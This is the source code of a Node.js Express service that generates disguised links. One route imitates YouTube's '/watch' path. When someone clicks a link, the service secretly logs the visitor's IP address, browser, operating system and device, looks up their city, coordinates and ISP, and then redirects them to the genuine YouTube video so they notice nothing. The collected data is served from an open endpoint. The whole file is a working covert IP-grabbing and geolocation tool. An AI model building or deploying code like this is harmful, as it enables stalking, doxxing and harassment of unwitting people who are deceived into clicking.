const express = require('express');
const axios = require('axios');
const path = require('path');
const useragent = require('useragent');

const app = express();
const PORT = process.env.PORT || 3000;
const SERVER_URL = process.env.SERVER_URL || 'https://ip-logger-kpo8.onrender.com';

// Store IPs in memory
let trackedIPs = [];

// Store URL mappings with timestamps
let urlMappings = new Map();

// Middleware to get real IP - MOVED TO TOP
app.use((req, res, next) => {
    req.realIp = req.headers['x-forwarded-for'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress ||
                 req.ip;
    next();
});

// Add CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Fonction pour générer un ID YouTube-like
function generateYouTubeId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < 11; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Fonction pour nettoyer les vieux mappings (plus vieux que 24h)
function cleanOldMappings() {
    const now = Date.now();
    for (const [key, value] of urlMappings.entries()) {
        if (now - value.timestamp > 24 * 60 * 60 * 1000) { // 24 heures
            urlMappings.delete(key);
        }
    }
}

// Fonction pour traiter l'IP et collecter les données
async function processIpAndCollectData(req, videoId) {
    try {
        let ip = req.realIp;
        if (typeof ip === 'string') {
            ip = ip.replace('::ffff:', '').split(',')[0].trim();
        }
        
        console.log('\x1b[36m%s\x1b[0m', `Processing visit from IP: ${ip}`);

        const agent = useragent.parse(req.headers['user-agent']);
        const deviceInfo = {
            browser: agent.family,
            browserVersion: agent.toVersion(),
            os: agent.os.toString(),
            device: agent.device.family,
            isMobile: agent.device.family !== 'Other',
            isBot: agent.isBot
        };

        // Pour les tests locaux
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8';
        }

        const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
        
        if (ipInfo.data.status === 'success') {
            console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
            
            trackedIPs.push({
                ip: ip,
                country: ipInfo.data.country,
                city: ipInfo.data.city,
                latitude: ipInfo.data.lat,
                longitude: ipInfo.data.lon,
                timestamp: new Date().toISOString(),
                deviceInfo: deviceInfo,
                isp: ipInfo.data.isp,
                org: ipInfo.data.org,
                as: ipInfo.data.as,
                timezone: ipInfo.data.timezone,
                videoId: videoId
            });

            console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);

            if (trackedIPs.length > 100) {
                trackedIPs = trackedIPs.slice(-100);
            }
        }
    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing IP data: ${error.message}`);
    }
}

// Route pour créer un lien court
app.get('/api/shorten', (req, res) => {
    try {
        cleanOldMappings(); // Nettoyer les vieux mappings

        const originalUrl = req.query.url;
        if (!originalUrl) {
            return res.status(400).json({ error: 'URL required' });
        }

        const videoId = originalUrl.split('v=')[1];
        if (!videoId) {
            return res.status(400).json({ error: 'Invalid video ID' });
        }

        const trackingId = generateYouTubeId();
        // Stocker avec un timestamp
        urlMappings.set(trackingId, {
            videoId: videoId,
            timestamp: Date.now(),
            visits: 0
        });
        
        if (urlMappings.size > 1000) {
            // Supprimer le plus ancien
            let oldestKey = null;
            let oldestTime = Infinity;
            for (const [key, value] of urlMappings.entries()) {
                if (value.timestamp < oldestTime) {
                    oldestTime = value.timestamp;
                    oldestKey = key;
                }
            }
            if (oldestKey) urlMappings.delete(oldestKey);
        }

        const trackingUrl = `${SERVER_URL}/t/${trackingId}`;
        console.log('\x1b[32m%s\x1b[0m', `Generated tracking URL: ${trackingUrl} for video: ${videoId}`);
        
        res.json({ 
            shortUrl: `https://youtu.be/watch?v=${videoId}`,
            trackingUrl: trackingUrl
        });
    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Route pour le tracking
app.get('/t/:id', async (req, res) => {
    try {
        const mapping = urlMappings.get(req.params.id);
        if (!mapping) {
            console.log('\x1b[33m%s\x1b[0m', `No video found for tracking ID: ${req.params.id}`);
            return res.redirect('https://youtube.com');
        }

        const videoId = mapping.videoId;
        mapping.visits++; // Incrémenter le compteur de visites

        // Process IP and collect data
        await processIpAndCollectData(req, videoId);

        // Mettre à jour le timestamp pour garder le lien actif
        mapping.timestamp = Date.now();
        
        // Redirect to YouTube
        res.redirect(`https://youtu.be/watch?v=${videoId}`);
    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error in tracking route: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// Watch route that mimics YouTube
app.get('/watch', async (req, res) => {
    try {
        const videoId = req.query.v;
        
        // Get real IP and clean it
        let ip = req.realIp.replace('::ffff:', '');
        ip = ip.split(',')[0].trim();
        
        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);

        // Parse user agent
        const agent = useragent.parse(req.headers['user-agent']);
        const deviceInfo = {
            browser: agent.family,
            browserVersion: agent.toVersion(),
            os: agent.os.toString(),
            device: agent.device.family,
            isMobile: agent.device.family !== 'Other',
            isBot: agent.isBot
        };

        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);

        // Pour les tests locaux
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8';
            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
        }

        try {
            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
            
            if (ipInfo.data.status === 'success') {
                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                
                // Store in memory with device info
                trackedIPs.push({
                    ip: ip,
                    country: ipInfo.data.country,
                    city: ipInfo.data.city,
                    latitude: ipInfo.data.lat,
                    longitude: ipInfo.data.lon,
                    timestamp: new Date().toISOString(),
                    deviceInfo: deviceInfo,
                    isp: ipInfo.data.isp,
                    org: ipInfo.data.org,
                    as: ipInfo.data.as,
                    timezone: ipInfo.data.timezone
                });

                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);

                if (trackedIPs.length > 100) {
                    trackedIPs = trackedIPs.slice(-100);
                }
            } else {
                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
            }
        } catch (apiError) {
            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
        }

        if (videoId) {
            res.redirect(`https://youtube.com/watch?v=${videoId}`);
        } else {
            res.redirect('https://youtube.com');
        }

    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// API route to get tracked IPs
app.get('/api/tracked-ips', (req, res) => {
    console.log('\x1b[36m%s\x1b[0m', `API request received from: ${req.ip}`);
    console.log('\x1b[32m%s\x1b[0m', `API: Found ${trackedIPs.length} entries in memory`);
    res.json(trackedIPs);
});

// Test route
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'API is working' });
});

// Start server
app.listen(PORT, () => {
    console.log('\x1b[32m%s\x1b[0m', `Server running on port ${PORT}`);
}); 